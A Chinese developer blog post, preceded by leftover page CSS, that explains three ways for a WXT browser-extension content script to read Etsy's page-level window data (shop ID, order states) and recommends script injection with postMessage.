3JNmTCm+Bc9hKVhsgJSI9pvp9Vdd++jmq6AXB2/HHrhcs5aTkVDv0DFzoHvKdq/mQsKX/4t7KJLDpOJW+IbAvMGoMkxfwAWZB8DT7W1diTE+WcgKz6pK1bs6z3daPwmJDsSKt6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在浏览器扩展开发中，Content Script（内容脚本）运行在与网页相同的环境中，但由于其处于隔离的执行环境（Isolated World），无法直接访问网页的 JavaScript 上下文，包括 <code>window</code> 对象的自定义属性。这在需要获取页面特定数据时（如 Etsy 店铺的 <code>shopId</code>、订单状态等）会成为一个问题。</p>
<p>本文档基于实际项目经验，详细介绍了在 WXT 框架下获取页面 <code>window</code> 对象的几种方案，并提供了完整的实现代码和对比分析。</p>
<h2 data-id="heading-1">需求</h2>
<p>在开发 Etsy 订单管理扩展时，需要从页面的 <code>window</code> 对象中获取以下数据：</p>
<ol>
<li><strong>店铺 ID（shopId）</strong>：<code>window.Etsy.Context.data.shop_id</code></li>
<li><strong>订单状态列表（orderStates）</strong>：<code>window.Etsy.Context.data.order_states</code></li>
</ol>
<p>这些数据存储在页面的主世界（Main World）中，而 Content Script 运行在隔离世界（Isolated World），无法直接访问。</p>
<h2 data-id="heading-2">方案</h2>
<h3 data-id="heading-3">方案一：web_accessible_resources + window.postMessage</h3>
<h4 data-id="heading-4">原理</h4>
<p>通过在 <code>manifest.json</code> 中配置 <code>web_accessible_resources</code>，将脚本文件注入到页面的主世界（Main World），使其能够直接访问页面的 <code>window</code> 对象。使用 <code>window.postMessage</code> 在 Content Script 和注入脚本之间进行双向通信。</p>
<h4 data-id="heading-5">实现流程</h4>
<ol>
<li>创建一个注入脚本文件（如 <code>page-inject.js</code>），用于在主世界中执行代码</li>
<li>在 <code>wxt.config.ts</code> 中配置 <code>web_accessible_resources</code>，将脚本指定为可访问资源</li>
<li>在 Content Script 中动态创建 <code>&lt;script&gt;</code> 标签，将脚本注入到页面中</li>
<li>使用 <code>window.postMessage</code> 在 Content Script 和注入脚本之间进行通信</li>
</ol>
<h4 data-id="heading-6">代码实现</h4>
<p><strong>1. 创建注入脚本（<code>public/page-inject.js</code>）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 注入到页面主世界的脚本
 * 用于直接访问页面的 window 对象，获取 Etsy 相关数据
 */</span>
(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-string">"use strict"</span>;

  <span class="hljs-comment">// 监听来自隔离世界（ISOLATED world）的 content script 的消息</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"message"</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) {
    <span class="hljs-comment">// 确保消息来自当前窗口</span>
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">source</span> !== <span class="hljs-variable language_">window</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 检查消息类型</span>
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span> &amp;&amp; event.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">"get-etsy-data"</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 在主世界中直接访问 window.Etsy.Context.data 对象</span>
        <span class="hljs-keyword">const</span> etsyData = <span class="hljs-variable language_">window</span>.<span class="hljs-property">Etsy</span>?.<span class="hljs-property">Context</span>?.<span class="hljs-property">data</span>;

        <span class="hljs-keyword">if</span> (etsyData) {
          <span class="hljs-keyword">const</span> shopId = etsyData.<span class="hljs-property">shop_id</span>;
          <span class="hljs-keyword">const</span> orderStates = etsyData.<span class="hljs-property">order_states</span>;

          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"✅ [主世界] 成功获取 Etsy 数据"</span>);

          <span class="hljs-comment">// 发送响应回隔离世界</span>
          <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">postMessage</span>(
            {
              <span class="hljs-attr">type</span>: <span class="hljs-string">"etsy-data-response"</span>,
              <span class="hljs-attr">requestId</span>: event.<span class="hljs-property">data</span>.<span class="hljs-property">requestId</span>,
              <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">shopId</span>: shopId,
              <span class="hljs-attr">orderStates</span>: orderStates,
            },
            <span class="hljs-string">"*"</span>
          );
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 发送错误响应</span>
          <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">postMessage</span>(
            {
              <span class="hljs-attr">type</span>: <span class="hljs-string">"etsy-data-response"</span>,
              <span class="hljs-attr">requestId</span>: event.<span class="hljs-property">data</span>.<span class="hljs-property">requestId</span>,
              <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
              <span class="hljs-attr">error</span>: <span class="hljs-string">"无法获取 Etsy 数据，请确保在 Etsy 店铺管理页面打开此扩展"</span>,
            },
            <span class="hljs-string">"*"</span>
          );
        }
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-comment">// 发送错误响应</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">postMessage</span>(
          {
            <span class="hljs-attr">type</span>: <span class="hljs-string">"etsy-data-response"</span>,
            <span class="hljs-attr">requestId</span>: event.<span class="hljs-property">data</span>.<span class="hljs-property">requestId</span>,
            <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">error</span>: error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">"未知错误"</span>,
          },
          <span class="hljs-string">"*"</span>
        );
      }
    }
  });

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"✅ [主世界] page-inject.js 已加载，可以访问 window.Etsy 对象"</span>);
})();
</code></pre>
<p><strong>2. 配置 WXT（<code>wxt.config.ts</code>）</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'wxt'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">'@wxt-dev/module-vue'</span>],
  <span class="hljs-attr">manifest</span>: {
    <span class="hljs-attr">web_accessible_resources</span>: [
      {
        <span class="hljs-attr">resources</span>: [<span class="hljs-string">'page-inject.js'</span>],
        <span class="hljs-attr">matches</span>: [<span class="hljs-string">'*://*.etsy.com/*'</span>],
        <span class="hljs-attr">use_dynamic_url</span>: <span class="hljs-literal">true</span>,
      },
    ],
  },
});
</code></pre>
<p><strong>3. Content Script 实现（<code>entrypoints/content.ts</code>）</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 注入脚本到页面主世界
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">injectScript</span>(<span class="hljs-params">scriptPath: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-comment">// 检查脚本是否已经注入</span>
    <span class="hljs-keyword">const</span> scriptId = <span class="hljs-string">`injected-script-<span class="hljs-subst">${scriptPath}</span>`</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(scriptId)) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✅ [隔离世界] 脚本 <span class="hljs-subst">${scriptPath}</span> 已存在，跳过注入`</span>);
      <span class="hljs-title function_">resolve</span>();
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"script"</span>);
    script.<span class="hljs-property">id</span> = scriptId;
    script.<span class="hljs-property">src</span> = browser.<span class="hljs-property">runtime</span>.<span class="hljs-title function_">getURL</span>(scriptPath <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>);
    script.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✅ [隔离世界] 脚本 <span class="hljs-subst">${scriptPath}</span> 注入成功`</span>);
      <span class="hljs-title function_">resolve</span>();
    };
    script.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`❌ [隔离世界] 脚本 <span class="hljs-subst">${scriptPath}</span> 注入失败`</span>);
      <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`脚本 <span class="hljs-subst">${scriptPath}</span> 注入失败`</span>));
    };
    (<span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>).<span class="hljs-title function_">appendChild</span>(script);
  });
}

<span class="hljs-comment">/**
 * 通过 postMessage 与主世界脚本通信，获取 Etsy 数据
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getEtsyDataFromMainWorld</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;{
  <span class="hljs-attr">success</span>: <span class="hljs-built_in">boolean</span>;
  shopId?: <span class="hljs-built_in">number</span>;
  orderStates?: <span class="hljs-title class_">OrderState</span>[];
  error?: <span class="hljs-built_in">string</span>;
}&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">async</span> (resolve, reject) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 确保注入脚本已加载</span>
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">injectScript</span>(<span class="hljs-string">"page-inject.js"</span>);

      <span class="hljs-comment">// 生成唯一的请求 ID</span>
      <span class="hljs-keyword">const</span> requestId = <span class="hljs-string">`etsy-data-<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>-<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random()}</span>`</span>;

      <span class="hljs-comment">// 设置超时，避免无限等待</span>
      <span class="hljs-keyword">const</span> timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">"message"</span>, handleResponse);
        <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"获取 Etsy 数据超时，主世界脚本可能未响应"</span>));
      }, <span class="hljs-number">5000</span>); <span class="hljs-comment">// 5秒超时</span>

      <span class="hljs-comment">// 处理响应</span>
      <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">event: MessageEvent</span>) {
        <span class="hljs-comment">// 确保消息来自当前窗口</span>
        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">source</span> !== <span class="hljs-variable language_">window</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// 检查消息类型和请求 ID</span>
        <span class="hljs-keyword">if</span> (
          event.<span class="hljs-property">data</span> &amp;&amp;
          event.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">"etsy-data-response"</span> &amp;&amp;
          event.<span class="hljs-property">data</span>.<span class="hljs-property">requestId</span> === requestId
        ) {
          <span class="hljs-built_in">clearTimeout</span>(timeout);
          <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">"message"</span>, handleResponse);

          <span class="hljs-keyword">const</span> { success, shopId, orderStates, error } = event.<span class="hljs-property">data</span>;

          <span class="hljs-keyword">if</span> (success &amp;&amp; shopId !== <span class="hljs-literal">undefined</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"✅ [隔离世界] 成功从主世界获取 Etsy 数据"</span>);
            <span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, shopId, orderStates });
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"⚠️ [隔离世界] 从主世界获取 Etsy 数据失败:"</span>, error);
            <span class="hljs-title function_">resolve</span>({
              <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
              <span class="hljs-attr">error</span>: error || <span class="hljs-string">"无法获取 Etsy 数据"</span>,
            });
          }
        }
      }

      <span class="hljs-comment">// 监听响应消息</span>
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"message"</span>, handleResponse);

      <span class="hljs-comment">// 发送请求到主世界</span>
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">postMessage</span>(
        {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"get-etsy-data"</span>,
          <span class="hljs-attr">requestId</span>: requestId,
        },
        <span class="hljs-string">"*"</span>
      );
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"📤 [隔离世界] 已发送获取 Etsy 数据请求到主世界"</span>);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"❌ [隔离世界] 获取 Etsy 数据时发生错误:"</span>, error);
      <span class="hljs-title function_">reject</span>(error);
    }
  });
}
</code></pre>
<h4 data-id="heading-7">优点</h4>
<ul>
<li>✅ 实现相对简单，逻辑清晰</li>
<li>✅ 兼容性好，适用于所有支持 Manifest V3 的浏览器</li>
<li>✅ 使用标准的 <code>postMessage</code> API，安全性高</li>
<li>✅ 不需要序列化函数，避免安全风险</li>
<li>✅ 在 WXT 框架中配置简单，易于维护</li>
</ul>
<h4 data-id="heading-8">缺点</h4>
<ul>
<li>⚠️ 需要在 <code>manifest.json</code> 中配置 <code>web_accessible_resources</code></li>
<li>⚠️ 需要动态注入脚本，可能有加载时序问题（可通过 <code>onload</code> 回调解决）</li>
</ul>
<hr/>
<h3 data-id="heading-9">方案二：web_accessible_resources + CustomEvent + 函数序列化</h3>
<h4 data-id="heading-10">原理</h4>
<p>同样通过 <code>web_accessible_resources</code> 注入脚本到页面主世界，但使用 <code>CustomEvent</code> 进行通信，并通过函数序列化的方式传递复杂逻辑。</p>
<h4 data-id="heading-11">实现流程</h4>
<ol>
<li>Content Script 将需要在页面上下文中执行的函数序列化为字符串</li>
<li>Content Script 创建并分发一个包含序列化函数的 <code>CustomEvent</code></li>
<li>注入脚本监听该事件，反序列化函数并在页面上下文中执行</li>
<li>执行结果通过另一个 <code>CustomEvent</code> 传回 Content Script</li>
</ol>
<h4 data-id="heading-12">代码示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Content Script 中</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getMyData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">Etsy</span>?.<span class="hljs-property">Context</span>?.<span class="hljs-property">data</span>;
}

<span class="hljs-title function_">indexSendMessageToLucky</span>(<span class="hljs-string">'run-index-fun'</span>, {
  <span class="hljs-attr">function</span>: getMyData.<span class="hljs-title function_">toString</span>()
}).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'res--&gt;'</span>, res)
});

<span class="hljs-comment">// 注入脚本中</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'custom-index-type'</span>, <span class="hljs-keyword">async</span> (e) =&gt; {
  <span class="hljs-keyword">const</span> { type, data } = e.<span class="hljs-property">detail</span>
  <span class="hljs-keyword">switch</span> (type) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'run-index-fun'</span>: {
      <span class="hljs-keyword">const</span> fn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">`return (<span class="hljs-subst">${data.<span class="hljs-keyword">function</span>}</span>)(...arguments)`</span>)
      <span class="hljs-keyword">const</span> rs = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn</span>(...(data.<span class="hljs-property">args</span> ?? []))
      <span class="hljs-title function_">luckySendMessageToIndex</span>(type, rs)
      <span class="hljs-keyword">break</span>
    }
  }
})
</code></pre>
<h4 data-id="heading-13">优点</h4>
<ul>
<li>✅ 可以传递复杂的函数逻辑</li>
<li>✅ <code>CustomEvent</code> 通信更灵活</li>
</ul>
<h4 data-id="heading-14">缺点</h4>
<ul>
<li>❌ 使用 <code>new Function()</code>，存在安全风险（可能受到 CSP 限制）</li>
<li>❌ 需要序列化函数，代码复杂度较高</li>
<li>❌ 同样需要配置 <code>web_accessible_resources</code></li>
<li>❌ 需要处理 iframe 检测</li>
</ul>
<hr/>
<h3 data-id="heading-15">方案三：world: "MAIN" 配置</h3>
<h4 data-id="heading-16">原理</h4>
<p>在 Content Script 的配置中指定 <code>world: "MAIN"</code>，使 Content Script 直接在页面的主世界中执行，从而直接访问页面的 <code>window</code> 对象。</p>
<h4 data-id="heading-17">实现流程</h4>
<ol>
<li>在 Content Script 的配置中设置 <code>world: "MAIN"</code></li>
<li>Content Script 直接在页面主世界中执行，访问 <code>window</code> 对象获取所需数据</li>
</ol>
<h4 data-id="heading-18">代码示例</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineContentScript</span>({
  <span class="hljs-attr">matches</span>: [<span class="hljs-string">"*://*.etsy.com/*"</span>],
  <span class="hljs-attr">runAt</span>: <span class="hljs-string">"document_end"</span>,
  <span class="hljs-attr">world</span>: <span class="hljs-string">"MAIN"</span>, <span class="hljs-comment">// 运行在页面主世界</span>
  <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 直接访问 window.Etsy 对象</span>
    <span class="hljs-keyword">const</span> shopId = <span class="hljs-variable language_">window</span>.<span class="hljs-property">Etsy</span>?.<span class="hljs-property">Context</span>?.<span class="hljs-property">data</span>?.<span class="hljs-property">shop_id</span>;
    <span class="hljs-comment">// ...</span>
  },
});
</code></pre>
<h4 data-id="heading-19">优点</h4>
<ul>
<li>✅ 实现最简单，无需额外的通信机制</li>
<li>✅ 不需要 <code>web_accessible_resources</code> 配置</li>
<li>✅ 性能最好，无需动态注入脚本</li>
<li>✅ 符合 Manifest V3 的推荐方式</li>
</ul>
<h4 data-id="heading-20">缺点</h4>
<ul>
<li>❌ <strong>WXT 框架可能不支持 <code>world: "MAIN"</code> 配置</strong>（这是关键问题）</li>
<li>❌ 即使支持，配置可能不会正确生成到 <code>manifest.json</code> 中</li>
<li>❌ 在实际测试中发现主世界脚本无法正确加载</li>
</ul>
<hr/>
<h2 data-id="heading-21">方案对比</h2>





















































<table><thead><tr><th>特性</th><th>方案一（postMessage）</th><th>方案二（CustomEvent）</th><th>方案三（world: MAIN）</th></tr></thead><tbody><tr><td><strong>实现复杂度</strong></td><td>中等</td><td>较高</td><td>低（理论上）</td></tr><tr><td><strong>兼容性</strong></td><td>✅ 高</td><td>✅ 高</td><td>❌ 低（WXT 可能不支持）</td></tr><tr><td><strong>安全性</strong></td><td>✅ 高</td><td>⚠️ 中（eval 风险）</td><td>✅ 高</td></tr><tr><td><strong>性能</strong></td><td>✅ 良好</td><td>✅ 良好</td><td>✅ 最好</td></tr><tr><td><strong>配置复杂度</strong></td><td>中等</td><td>中等</td><td>低（理论上）</td></tr><tr><td><strong>CSP 限制</strong></td><td>✅ 无</td><td>❌ 可能受限</td><td>✅ 无</td></tr><tr><td><strong>WXT 支持</strong></td><td>✅ 完全支持</td><td>✅ 完全支持</td><td>❌ 不支持或未验证</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-22">实际测试</h2>
<h3 data-id="heading-23">测试环境</h3>
<ul>
<li><strong>框架</strong>：WXT v0.20.6</li>
<li><strong>浏览器</strong>：Chrome（Manifest V3）</li>
<li><strong>目标网站</strong>：Etsy 店铺管理页面</li>
</ul>
<h3 data-id="heading-24">方案一测试结果</h3>
<p>✅ <strong>成功</strong></p>
<ul>
<li>脚本注入正常</li>
<li><code>postMessage</code> 通信正常</li>
<li>能够成功获取 <code>window.Etsy.Context.data</code></li>
<li>性能表现良好</li>
</ul>
<p><strong>测试日志：</strong></p>
<pre><code class="hljs language-css" lang="css">✅ <span class="hljs-selector-attr">[隔离世界]</span> 脚本 page-inject<span class="hljs-selector-class">.js</span> 注入成功
✅ <span class="hljs-selector-attr">[主世界]</span> page-inject<span class="hljs-selector-class">.js</span> 已加载，可以访问 window<span class="hljs-selector-class">.Etsy</span> 对象
📤 <span class="hljs-selector-attr">[隔离世界]</span> 已发送获取 Etsy 数据请求到主世界
✅ <span class="hljs-selector-attr">[主世界]</span> 成功获取 Etsy 数据
✅ <span class="hljs-selector-attr">[隔离世界]</span> 成功从主世界获取 Etsy 数据
</code></pre>
<h3 data-id="heading-25">方案三测试结果</h3>
<p>❌ <strong>失败</strong></p>
<ul>
<li>配置 <code>world: "MAIN"</code> 后，生成的 <code>manifest.json</code> 中可能不包含该配置</li>
<li>即使手动添加配置，主世界脚本也无法正确加载</li>
<li>控制台出现超时错误：<code>获取 shopId 超时，主世界脚本可能未加载</code></li>
</ul>
<p><strong>测试日志：</strong></p>
<pre><code class="hljs language-css" lang="css">📤 <span class="hljs-selector-attr">[隔离世界]</span> 已发送获取 shopId 请求到主世界
⚠️ 获取 shopId 失败: 获取 shopId 超时，主世界脚本可能未加载
</code></pre>
<h3 data-id="heading-26">方案二测试结果</h3>
<p>⚠️ <strong>未测试</strong></p>
<ul>
<li>由于方案一已经满足需求，且方案二存在安全风险，未进行实际测试</li>
<li>理论上可行，但不推荐使用</li>
</ul>
<hr/>
<h2 data-id="heading-27">最终采用</h2>
<p>基于实际测试结果和方案对比，<strong>最终采用方案一（web_accessible_resources + window.postMessage）</strong>。</p>
<h3 data-id="heading-28">选择理由</h3>
<ol>
<li><strong>兼容性最佳</strong>：在 WXT 框架中完全支持，配置简单</li>
<li><strong>可靠性高</strong>：经过实际测试，功能稳定可靠</li>
<li><strong>安全性好</strong>：使用标准的 <code>postMessage</code> API，不涉及 <code>eval</code> 等安全风险</li>
<li><strong>易于维护</strong>：代码结构清晰，逻辑简单，便于后续维护</li>
<li><strong>性能良好</strong>：虽然需要动态注入脚本，但通过 <code>onload</code> 回调确保时序正确，性能影响可忽略</li>
</ol>
<h3 data-id="heading-29">完整实现代码</h3>
<p>参考本文档的"方案一"部分，包含完整的代码实现。</p>
<hr/>
<h2 data-id="heading-30">总结</h2>
<p>在 WXT 框架下获取页面 <code>window</code> 对象，推荐使用 <strong>web_accessible_resources + window.postMessage</strong> 方案。虽然理论上 <code>world: "MAIN"</code> 配置是最优方案，但由于 WXT 框架可能不支持或配置不生效，实际项目中无法使用。</p>
<h3 data-id="heading-31">关键要点</h3>
<ol>
<li><strong>隔离世界限制</strong>：Content Script 运行在隔离世界，无法直接访问页面主世界的 <code>window</code> 对象</li>
<li><strong>注入脚本方案</strong>：通过 <code>web_accessible_resources</code> 将脚本注入到主世界是可靠的解决方案</li>
<li><strong>通信机制</strong>：使用 <code>window.postMessage</code> 进行跨世界通信，安全且标准</li>
<li><strong>框架兼容性</strong>：在选择方案时，必须考虑框架的实际支持情况，不能仅依赖理论最优方案</li>
</ol>
<h3 data-id="heading-32">最佳实践</h3>
<ol>
<li>✅ 使用 <code>web_accessible_resources</code> 配置注入脚本</li>
<li>✅ 通过 <code>script.onload</code> 确保脚本加载完成后再通信</li>
<li>✅ 使用请求 ID 机制支持并发请求</li>
<li>✅ 添加超时机制避免无限等待</li>
<li>✅ 完整的错误处理和日志记录</li>
<li>✅ 在注入前检查脚本是否已存在，避免重复注入</li>
</ol>
<h3 data-id="heading-33">注意事项</h3>
<ol>
<li>⚠️ 确保 <code>web_accessible_resources</code> 中的 <code>matches</code> 配置正确，只允许在需要的域名下访问</li>
<li>⚠️ 使用 <code>use_dynamic_url: true</code> 确保资源 URL 动态生成，提高安全性</li>
<li>⚠️ 在 <code>postMessage</code> 中验证消息来源，确保安全性</li>
<li>⚠️ 处理 iframe 场景时，需要检查 <code>window.top === window.self</code></li>
</ol>
<p>通过本文档的方案，可以在 WXT 框架下可靠地获取页面 <code>window</code> 对象，满足各种实际开发需求。</p>
<hr/>
<p><strong>文档版本</strong>：v1.0<br/>
